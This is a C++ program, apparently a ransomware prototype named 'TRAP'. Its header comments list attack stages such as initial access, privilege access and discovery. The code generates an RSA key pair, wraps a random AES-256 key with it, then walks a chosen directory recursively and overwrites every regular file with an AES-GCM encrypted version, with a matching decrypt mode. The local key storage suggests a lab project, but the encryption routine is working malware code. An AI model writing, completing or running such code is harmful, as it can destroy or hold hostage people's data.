#include <iostream>
#include <filesystem>
#include <fstream>
#include <string>
#include <vector>
#include <cstring>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
// initial access
// Execution
// Privilege access
// Discovery
// Key management (private and public key)
// Encryption

namespace fs = std::filesystem;

constexpr const char* kMagic = "TRAP";
constexpr int kAesKeyLen = 32;
constexpr int kIvLen = 12;
constexpr int kTagLen = 16;

const std::string kPrivateKeyFile = "trap_private.pem";
const std::string kPublicKeyFile = "trap_public.pem";
const std::string kWrappedKeyFile = "trap_key.bin";

bool readFile(const fs::path& filePath, std::vector<unsigned char>& data)
{
  std::ifstream in(filePath, std::ios::binary);
  if (!in)
    return false;

  data.assign(
    std::istreambuf_iterator<char>(in),
    std::istreambuf_iterator<char>()
  );
  return true;
}

bool writeFile(const fs::path& filePath, const unsigned char* data, size_t len)
{
  std::ofstream out(filePath, std::ios::binary | std::ios::trunc);
  if (!out)
    return false;

  out.write(reinterpret_cast<const char*>(data), len);
  return true;
}

bool generateKeyPair(const std::string& privPath, const std::string& pubPath)
{
  EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, nullptr);
  if (!ctx)
    return false;

  EVP_PKEY* pkey = nullptr;
  bool ok = EVP_PKEY_keygen_init(ctx) > 0
    && EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, 2048) > 0
    && EVP_PKEY_keygen(ctx, &pkey) > 0;
  EVP_PKEY_CTX_free(ctx);

  if (!ok) {
    std::cerr << "Failed to generate RSA key pair\n";
    return false;
  }

  BIO* out = BIO_new_file(privPath.c_str(), "w");
  ok = out && PEM_write_bio_PrivateKey(out, pkey, nullptr, nullptr, 0, nullptr, nullptr);
  if (out)
    BIO_free(out);

  out = BIO_new_file(pubPath.c_str(), "w");
  ok = ok && out && PEM_write_bio_PUBKEY(out, pkey);
  if (out)
    BIO_free(out);

  EVP_PKEY_free(pkey);
  return ok;
}

// privateKey = true loads the private key, false loads the public key
EVP_PKEY* loadKey(const std::string& path, bool privateKey)
{
  BIO* in = BIO_new_file(path.c_str(), "r");
  if (!in)
    return nullptr;

  EVP_PKEY* key = privateKey
    ? PEM_read_bio_PrivateKey(in, nullptr, nullptr, nullptr)
    : PEM_read_bio_PUBKEY(in, nullptr, nullptr, nullptr);

  BIO_free(in);
  return key;
}

bool wrapAesKey(
  EVP_PKEY* publicKey,
  const unsigned char* aesKey,
  std::vector<unsigned char>& wrapped
) {
  EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new(publicKey, nullptr);
  if (!ctx)
    return false;

  size_t outlen = 0;
  bool ok = EVP_PKEY_encrypt_init(ctx) > 0
    && EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) > 0
    && EVP_PKEY_encrypt(ctx, nullptr, &outlen, aesKey, kAesKeyLen) > 0;

  if (ok) {
    wrapped.resize(outlen);
    ok = EVP_PKEY_encrypt(ctx, wrapped.data(), &outlen, aesKey, kAesKeyLen) > 0;
    wrapped.resize(outlen);
  }

  EVP_PKEY_CTX_free(ctx);
  return ok;
}

bool unwrapAesKey(
  EVP_PKEY* privateKey,
  const std::vector<unsigned char>& wrapped,
  unsigned char* aesKey
) {
  EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new(privateKey, nullptr);
  if (!ctx)
    return false;

  // The output buffer must hold up to one full RSA block even though the
  // recovered key is only 32 bytes
  unsigned char buf[512];
  size_t outlen = sizeof(buf);
  bool ok = EVP_PKEY_decrypt_init(ctx) > 0
    && EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) > 0
    && EVP_PKEY_decrypt(ctx, buf, &outlen, wrapped.data(), wrapped.size()) > 0
    && outlen == kAesKeyLen;

  if (ok)
    std::memcpy(aesKey, buf, kAesKeyLen);

  EVP_PKEY_CTX_free(ctx);
  return ok;
}

bool encryptAES(
  const unsigned char* plaintext,
  int plaintext_len,
  const unsigned char* key,
  const unsigned char* iv,
  std::vector<unsigned char>& ciphertext,
  unsigned char* tag
) {
  EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();

  if (!ctx)
    return false;

  int len;
  int ciphertext_len;

  EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
  EVP_EncryptInit_ex(ctx, nullptr, nullptr, key, iv);

  ciphertext.resize(plaintext_len + EVP_MAX_BLOCK_LENGTH);

  EVP_EncryptUpdate(ctx, ciphertext.data(), &len, plaintext, plaintext_len);
  ciphertext_len = len;

  EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len);
  ciphertext_len += len;
  ciphertext.resize(ciphertext_len);

  EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, kTagLen, tag);

  EVP_CIPHER_CTX_free(ctx);

  return true;
}

bool decryptAES(
  const unsigned char* ciphertext,
  int ciphertext_len,
  const unsigned char* key,
  const unsigned char* iv,
  const unsigned char* tag,
  std::vector<unsigned char>& plaintext
) {
  EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();

  if (!ctx)
    return false;

  int len;
  int plaintext_len;

  EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
  EVP_DecryptInit_ex(ctx, nullptr, nullptr, key, iv);

  plaintext.resize(ciphertext_len + EVP_MAX_BLOCK_LENGTH);

  EVP_DecryptUpdate(ctx, plaintext.data(), &len, ciphertext, ciphertext_len);
  plaintext_len = len;

  EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, kTagLen, const_cast<unsigned char*>(tag));

  // A failed final means the tag did not verify — wrong key or corrupted data
  if (EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &len) <= 0) {
    EVP_CIPHER_CTX_free(ctx);
    return false;
  }
  plaintext_len += len;
  plaintext.resize(plaintext_len);

  EVP_CIPHER_CTX_free(ctx);

  return true;
}

// File layout after encryption: magic | IV (12) | tag (16) | ciphertext
bool encryptFile(const fs::path& filePath, const unsigned char* aesKey)
{
  std::vector<unsigned char> plaintext;
  if (!readFile(filePath, plaintext)) {
    std::cerr << "Failed to open file: " << filePath << '\n';
    return false;
  }

  unsigned char iv[kIvLen];
  unsigned char tag[kTagLen];
  if (RAND_bytes(iv, sizeof(iv)) != 1) {
    std::cerr << "Failed to generate IV\n";
    return false;
  }

  std::vector<unsigned char> ciphertext;
  if (!encryptAES(plaintext.data(), plaintext.size(), aesKey, iv, ciphertext, tag)) {
    std::cerr << "Encryption failed for: " << filePath << '\n';
    return false;
  }

  std::ofstream out(filePath, std::ios::binary | std::ios::trunc);
  if (!out) {
    std::cerr << "Failed to write file: " << filePath << '\n';
    return false;
  }

  out.write(kMagic, std::strlen(kMagic));
  out.write(reinterpret_cast<const char*>(iv), kIvLen);
  out.write(reinterpret_cast<const char*>(tag), kTagLen);
  out.write(reinterpret_cast<const char*>(ciphertext.data()), ciphertext.size());

  return true;
}

bool decryptFile(const fs::path& filePath, const unsigned char* aesKey)
{
  std::vector<unsigned char> data;
  if (!readFile(filePath, data)) {
    std::cerr << "Failed to open file: " << filePath << '\n';
    return false;
  }

  size_t headerLen = std::strlen(kMagic) + kIvLen + kTagLen;
  if (data.size() < headerLen
      || std::memcmp(data.data(), kMagic, std::strlen(kMagic)) != 0) {
    return false; // not an encrypted file, skip silently
  }

  const unsigned char* iv = data.data() + std::strlen(kMagic);
  const unsigned char* tag = iv + kIvLen;
  const unsigned char* ciphertext = tag + kTagLen;
  int ciphertext_len = static_cast<int>(data.size() - headerLen);

  std::vector<unsigned char> plaintext;
  if (!decryptAES(ciphertext, ciphertext_len, aesKey, iv, tag, plaintext)) {
    std::cerr << "Decryption failed (wrong key or corrupted): " << filePath << '\n';
    return false;
  }

  if (!writeFile(filePath, plaintext.data(), plaintext.size())) {
    std::cerr << "Failed to write file: " << filePath << '\n';
    return false;
  }

  return true;
}

// Returns the AES key for this run, either by unwrapping the existing one
// or by generating a fresh one and wrapping it with the public key.
bool getAesKey(unsigned char* aesKey)
{
  if (fs::exists(kWrappedKeyFile)) {
    EVP_PKEY* privateKey = loadKey(kPrivateKeyFile, true);
    if (!privateKey) {
      std::cerr << "Failed to load " << kPrivateKeyFile << '\n';
      return false;
    }

    std::vector<unsigned char> wrapped;
    bool ok = readFile(kWrappedKeyFile, wrapped)
      && unwrapAesKey(privateKey, wrapped, aesKey);

    EVP_PKEY_free(privateKey);
    if (!ok) {
      std::cerr << "Failed to unwrap AES key with private key\n";
      return false;
    }
    return true;
  }

  EVP_PKEY* publicKey = loadKey(kPublicKeyFile, false);
  if (!publicKey) {
    std::cerr << "Failed to load " << kPublicKeyFile << '\n';
    return false;
  }

  std::vector<unsigned char> wrapped;
  bool ok = RAND_bytes(aesKey, kAesKeyLen) == 1
    && wrapAesKey(publicKey, aesKey, wrapped)
    && writeFile(kWrappedKeyFile, wrapped.data(), wrapped.size());

  EVP_PKEY_free(publicKey);
  if (!ok) {
    std::cerr << "Failed to generate and wrap AES key\n";
    return false;
  }
  return true;
}

int main(int argc, char* argv[])
{
  if (argc != 3) {
    std::cerr << "Usage: " << argv[0] << " <encrypt|decrypt> <directory>\n";
    return 1;
  }

  std::string mode = argv[1];
  fs::path directory = argv[2];

  if (mode != "encrypt" && mode != "decrypt") {
    std::cerr << "Usage: " << argv[0] << " <encrypt|decrypt> <directory>\n";
    return 1;
  }

  if (!fs::exists(directory) || !fs::is_directory(directory)) {
    std::cerr << "Invalid directory\n";
    return 1;
  }

  if (!fs::exists(kPrivateKeyFile) || !fs::exists(kPublicKeyFile)) {
    std::cout << "Generating RSA key pair...\n";
    if (!generateKeyPair(kPrivateKeyFile, kPublicKeyFile)) {
      std::cerr << "Failed to save key pair\n";
      return 1;
    }
    std::cout << "Keys saved: " << kPrivateKeyFile << ", " << kPublicKeyFile << '\n';
  }

  unsigned char aesKey[kAesKeyLen];
  if (!getAesKey(aesKey)) {
    std::cerr << "No AES key available\n";
    return 1;
  }

  try {
    for (const auto& entry : fs::recursive_directory_iterator(
          directory, fs::directory_options::skip_permission_denied
          ))
    {
      if (!entry.is_regular_file())
        continue;

      bool ok = (mode == "encrypt")
        ? encryptFile(entry.path(), aesKey)
        : decryptFile(entry.path(), aesKey);

      if (ok) {
        std::cout << (mode == "encrypt" ? "Encrypted: " : "Decrypted: ")
                  << entry.path() << '\n';
      }
    }
  }
  catch (const fs::filesystem_error& e) {
    std::cerr << "Filesystem error:" << e.what() << '\n';
  }

  return 0;
}
